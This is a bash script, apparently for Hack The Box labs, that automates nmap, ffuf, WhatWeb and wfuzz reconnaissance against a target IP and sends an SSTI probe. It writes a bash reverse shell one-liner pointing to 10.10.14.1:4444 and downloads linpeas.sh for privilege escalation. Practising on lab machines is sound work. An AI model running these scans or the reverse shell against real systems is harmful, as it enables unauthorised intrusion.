#!/usr/bin/env bash
# HTB Recon Automation Suite - Modular Scripts Per Phase
# Usage: ./htb_recon.sh

set -euo pipefail

# ─────────────────────────────────────────────────────────────────────────────
# Global Vars & Colors
# ─────────────────────────────────────────────────────────────────────────────
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
MAGENTA="\033[1;35m"
CYAN="\033[1;36m"
WHITE="\033[1;37m"
RESET="\033[0m"

read -rp $'\n\033[1;36m[*] Enter the target IP address: \033[0m' TARGET_IP

PS3=$'\nChoose scan intensity: '
options=("1) Passive" "2) Normal" "3) Aggressive")
select opt in "${options[@]}"; do
  case $REPLY in
    1) LEVEL="low"; break;;
    2) LEVEL="medium"; break;;
    3) LEVEL="high"; break;;
    *) echo "Invalid option";;
  esac
done

mkdir -p results_$TARGET_IP && cd results_$TARGET_IP

# ─────────────────────────────────────────────────────────────────────────────
# 🔍 INITIAL RECON
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${BLUE}[Initial Recon] Running Nmap Scan...${RESET}"
if [[ "$LEVEL" == "low" ]]; then
  nmap -T2 -F -oN nmap_initial.txt $TARGET_IP
elif [[ "$LEVEL" == "medium" ]]; then
  nmap -sC -sV -T3 -oN nmap_initial.txt $TARGET_IP
else
  nmap -p- -A -sC -sV -T4 -oN nmap_initial.txt $TARGET_IP
fi

# ─────────────────────────────────────────────────────────────────────────────
# 🌐 WEB CONTENT DISCOVERY
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${BLUE}[Web Content Discovery] Running ffuf...${RESET}"
if [[ "$LEVEL" == "low" ]]; then
  ffuf -u http://$TARGET_IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 154 -o ffuf.txt
elif [[ "$LEVEL" == "medium" ]]; then
  ffuf -u http://$TARGET_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 154 -o ffuf.txt
else
  ffuf -u http://$TARGET_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -fs 154 -t 100 -o ffuf.txt
fi

# ─────────────────────────────────────────────────────────────────────────────
# 🧠 WEB TECH FINGERPRINTING
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${BLUE}[Web Tech Fingerprinting] Running WhatWeb...${RESET}"
whatweb http://$TARGET_IP > whatweb.txt

# ─────────────────────────────────────────────────────────────────────────────
# 🔎 NSE SCRIPTS
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${BLUE}[NSE Scripts] Running HTTP NSE scans...${RESET}"
nmap -p80 --script http-enum,http-git,http-robots.txt,http-headers -oN nmap_nse.txt $TARGET_IP

# ─────────────────────────────────────────────────────────────────────────────
# 📤 FILE UPLOAD TESTING
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${BLUE}[File Upload Testing] Running wfuzz simulation...${RESET}"
if [[ "$LEVEL" != "low" ]]; then
  wfuzz -w /usr/share/seclists/Fuzzing/quick-win.txt -u http://$TARGET_IP/upload.php -d "file=FUZZ" -t 10 --hc 404 -o json > wfuzz_upload.txt
else
  echo "${YELLOW}[!] Skipping upload fuzz for passive mode${RESET}"
fi

# ─────────────────────────────────────────────────────────────────────────────
# 🧪 BASIC INJECTION CHECKS
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${BLUE}[Basic Injection Checks] Simulating SSTI/Command checks...${RESET}"
echo "Testing input reflection on /search?q=..."
curl -s "http://$TARGET_IP/search?q={{7*7}}" > ssti_test.txt || true

# ─────────────────────────────────────────────────────────────────────────────
# 💣 REVERSE SHELL PAYLOAD DELIVERY
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${BLUE}[Reverse Shell Payload] Generating reverse shell snippets...${RESET}"
echo "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1" > reverse_shell.txt

# ─────────────────────────────────────────────────────────────────────────────
# 🧹 PRIVILEGE ESCALATION RECON
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${BLUE}[Privilege Escalation Recon] Prep linpeas.sh...${RESET}"
wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh

# ─────────────────────────────────────────────────────────────────────────────
# ✅ SUMMARY
# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${GREEN}=============== SCAN SUMMARY ===============${RESET}"
echo -e "${CYAN}🔍 Nmap:${RESET}    $(grep open nmap_initial.txt | wc -l) ports open"
echo -e "${CYAN}🌐 FFUF:${RESET}    $(grep URL ffuf.txt | wc -l) paths discovered"
echo -e "${CYAN}🧠 WhatWeb:${RESET} $(cat whatweb.txt | wc -l) technologies found"
echo -e "${CYAN}📤 Upload:${RESET}  $(cat wfuzz_upload.txt 2>/dev/null | wc -l) payloads tried"
echo -e "${CYAN}🧪 SSTI:${RESET}     Check 'ssti_test.txt' for reflection"
echo -e "${CYAN}💣 Reverse Shell:${RESET}  Payload saved to reverse_shell.txt"
echo -e "${CYAN}🧹 LinPEAS:${RESET}   Script ready: ./linpeas.sh (run on target)"
echo -e "${GREEN}===========================================${RESET}"
echo -e "${MAGENTA}[!] Review outputs in results_$TARGET_IP/${RESET}"

exit 0
